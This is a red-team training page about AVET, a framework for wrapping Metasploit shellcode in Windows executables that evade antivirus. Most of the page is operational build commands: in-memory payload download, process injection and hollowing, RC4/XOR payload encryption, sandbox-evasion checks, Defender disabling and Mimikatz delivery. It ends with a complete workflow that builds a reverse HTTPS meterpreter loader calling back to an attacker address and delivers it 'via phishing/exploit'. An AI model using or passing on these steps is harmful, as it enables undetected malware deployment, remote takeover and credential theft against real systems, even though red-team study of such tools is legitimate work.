---
layout: training-page
title: "AVET — AntiVirus Evasion Tool — Red Team Academy"
module: "Evasion"
tags:
  - av-evasion
  - shellcode
  - payload
  - windows
  - evasion
page_key: "evasion-avet"
render_with_liquid: false
---

# AVET — AntiVirus Evasion Tool

AVET is a modular AV evasion framework for building Windows executables that bypass antivirus detection. It wraps Metasploit-generated shellcode in customizable C executables, applying payload delivery methods, encryption, encoding, sandbox evasion checks, and injection techniques — all configurable via shell build scripts. Although no longer actively developed, its documented techniques remain highly relevant for understanding AV evasion fundamentals.

## Architecture Overview

AVET's build system composes three configurable modules into a single Windows executable:

- **Payload/Data retrieval method** — how the shellcode is loaded (static, file, download)
- **Payload execution method** — how the shellcode is run (direct exec, inject, hollow)
- **Sandbox/debugger evasion checks** — environmental checks before execution

```
# Example build script composition:
set_payload_source download_powershell    # Fetch shellcode via PowerShell
set_payload_execution_method exec_shellcode64  # Execute as 64-bit shellcode
add_evasion is_debugger_present          # Stop if debugger detected
add_evasion evasion_by_sleep 3           # Sleep 3 seconds to beat timeouts
set_key_source from_command_line_hex     # Key passed at runtime (not in binary)
set_decoder rc4                          # RC4 decrypt payload at runtime
```

## Install

```
# Targets Kali 64-bit + tdm-gcc (MinGW for cross-compiling Windows PE)
git clone https://github.com/govolution/avet
cd avet
./setup.sh    # Installs wine + tdm-gcc; walks through tdm-gcc installer GUI

# Quick build mode via avet.py:
python3 avet.py
```

## Data Retrieval Methods

Controls how the payload (shellcode, key, or command) is sourced.

```
# Static — compiled into binary at build time:
set_payload_source static_from_file     # From C-array file: unsigned char buf[] = "\x00..."
set_payload_source static_from_here     # Inline in build script

# Dynamic — read from file at runtime:
set_payload_source dynamic_from_file    # Reads raw bytes from file path given at runtime

# Command-line — passed when the .exe is run:
set_payload_source from_command_line_hex  # Hex string: "11aabb22..."
set_payload_source from_command_line_raw  # Raw ASCII bytes

# Download — fetches from C2 at runtime (no payload on disk initially):
set_payload_source download_powershell   # PowerShell Invoke-WebRequest
set_payload_source download_certutil     # certutil.exe -urlcache -split -f URI
set_payload_source download_curl         # curl (file dropped to disk)
set_payload_source download_bitsadmin    # BITSAdmin utility (LOLBIN)
set_payload_source download_internet_explorer  # IE COM object download
set_payload_source download_socket       # Direct socket — NO file dropped to disk

# download_socket is stealthiest — payload fetched and executed in memory only
```

## Payload Execution Methods

Controls how the retrieved shellcode is executed.

```
# Direct execution:
set_payload_execution_method exec_shellcode    # 32-bit shellcode via C function binding
set_payload_execution_method exec_shellcode64  # 64-bit shellcode via C + VirtualProtect
set_payload_execution_method exec_shellcode_ASCIIMSF  # ASCIIMSF encoded shellcode via call eax

# Process injection (into target PID):
set_payload_info_source from_command_line_raw  # Target PID + DLL path from command line
set_payload_execution_method inject_dll        # DLL injection via CreateRemoteThread
set_payload_execution_method inject_shellcode  # Shellcode injection via CreateRemoteThread

# Process hollowing (creates new process, hollows it):
set_payload_execution_method hollowing32  # 32-bit PE into 32-bit target process
set_payload_execution_method hollowing64  # 64-bit PE into 64-bit target process

# Execution chains (command execution at startup):
set_command_source static_from_here 'calc.exe'
set_command_exec exec_via_cmd          # Execute command via cmd.exe
```

## Encryption and Encoding

Encrypts the payload before compile time. Decryptor runs at execution time, decrypting in memory just before exec — so on-disk payload is always encrypted.

```
# XOR encoding (rolling XOR, multi-byte key):
encode_payload xor input/shellcode_raw.txt input/shellcode_enc.txt input/key_raw.txt
set_key_source static_from_file
set_decoder xor

# RC4 encryption (with key from command line — key never in binary):
generate_key preset aabbccddee input/key_raw.txt
encode_payload rc4 input/shellcode_raw.txt input/shellcode_enc.txt input/key_raw.txt
set_key_source from_command_line_hex
set_decoder rc4

# AVET custom encoding (ASCII-format reinterpretation):
encode_payload avet input/shellcode_raw.txt input/shellcode_avet.txt
set_decoder avet

# Multiple encoding passes (stack layers):
# Encode with rc4, then encode result with xor → two decryption passes at runtime
```

## Sandbox and Debugger Evasion

Checks performed before decryption and execution. If any check fails, the executable silently exits — no payload ever runs in a sandbox.

```
# Queue up to 10 checks (in order):

# IsDebuggerPresent API check:
add_evasion is_debugger_present

# Time-based evasion (sandbox fast-forward detection):
add_evasion evasion_by_sleep 3          # Sleep N seconds, then verify wall time elapsed
add_evasion sleep_by_ping 4             # Halt via ping localhost N times (1/sec)
add_evasion check_fast_forwarding       # Compares sleep duration vs actual elapsed time
add_evasion get_tickcount               # GetTickCount before/after sleep comparison

# Environment checks (user/machine fingerprinting):
add_evasion has_username 'IEUser'       # Only run if username matches (target-specific)

# File system check (require specific file to exist):
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'  # Standard file must exist

# User interaction checks (sandboxes usually don't interact):
add_evasion interaction_msg_box         # Spawn arithmetic messagebox — requires human input
add_evasion interaction_getchar         # Wait for keyboard input via getchar()
add_evasion interaction_system_pause    # system("pause") — wait for keypress

# CPU cores check (sandboxes often have 1 core):
# See build_cpucores_revhttps_win32.sh example
```

## Pre-Built Scripts — Key Examples

```
# All scripts are in avet/build/ and must be run from the avet/ directory:

# Basic download + exec (shellcode via PowerShell):
./build/build_downloadpsh_revhttps_win32.sh

# Memory-only delivery (socket download, no file drop):
./build/build_downloadsocket_revhttps_win32.sh
./build/build_downloadsocket_mtrprtrxor_revhttps_win64.sh  # + XOR encryption

# certutil download (LOLBin delivery):
./build/build_downloadcertutil_revhttps_win32.sh

# BITSAdmin download (LOLBin, blends with Windows Update traffic):
./build/build_downloadbitsadmin_revhttps_win32.sh
./build/build_downloadbitsadmin_mtrprtrxor_revhttps_win64.sh

# Process hollowing:
./build/build_hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win32.sh

# Mimikatz delivery with RC4 + fibonacci evasion:
./build/build_fibonacci_rc4_mimikatz.sh

# RC4 + domain-check evasion + Mimikatz:
./build/build_checkdomain_rc4_mimikatz.sh

# Disable Windows Defender via PowerShell, then deliver XOR-encoded shellcode:
./build/build_disablewindefpsh_xorfromcmd_revhttps_win64.sh

# Adversarial examples against ML-based AV (static detector bypass):
./build/build_eval_adversarial_dos.sh    # DOS header manipulation
./build/build_eval_adversarial_extend.sh # PE extension tricks
./build/build_eval_adversarial_padding.sh # Padding-based bypass
./build/build_eval_adversarial_shift.sh  # Section shift
./build/build_eval_adversarial_si.sh     # Section injection
```

## Adversarial Examples Against ML AV

AVET includes techniques to generate adversarial examples that bypass ML-based static AV engines by manipulating PE header fields without affecting execution:

```
# Techniques (modify PE structure without breaking execution):
# 1. DOS header padding    — fill unused DOS stub space
# 2. PE extension          — extend sections beyond actual content
# 3. Byte padding          — add non-functional bytes at specific offsets
# 4. Section shifting      — relocate sections within PE layout
# 5. Section injection     — add dummy sections

# Build and test all adversarial variants:
python3 build_script_tester.py    # Generates samples from all build scripts

# Usage for research: creates a dataset of "malicious" samples with varying evasion techniques
# Useful for: testing your own AV detection, training classifiers, red team capability testing
```

## Complete Workflow Example

```
# Goal: deploy meterpreter HTTPS shell on 64-bit Windows target
# Technique: socket download (no file drop) + XOR encryption + sleep evasion

# Step 1: Generate Metasploit shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=10.10.14.5 LPORT=443 \
  -f raw -o avet/input/shellcode_raw.txt

# Step 2: Start Metasploit listener
msfconsole -q -x "
use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_https;
set LHOST 10.10.14.5;
set LPORT 443;
run -j"

# Step 3: Host the shellcode (AVET will download it at exec time)
python3 -m http.server 8080

# Step 4: Build the evasive loader
# Uses: socket download (in-memory) + XOR + evasion_by_sleep
cd avet/
./build/build_downloadsocket_mtrprtrxor_revhttps_win64.sh

# Step 5: Deliver output/payload.exe to target via phishing/exploit
# The target's AV sees: encrypted PE with sleep+debugger checks, no shellcode
# At runtime: checks pass → downloads shellcode → decrypts in memory → executes
```

## Resources

- AVET (archived) — `github.com/govolution/avet`
- See also: AVET CHANGELOG for technique evolution history
- Related: [AV / EDR Evasion](/evasion/av-edr-evasion/) — broader evasion techniques
- Related: [Shellcode Loaders](/evasion/shellcode-loaders/) — modern in-memory loaders
- Related: [PE Obfuscation](/evasion/pe-obfuscation/) — PE manipulation techniques
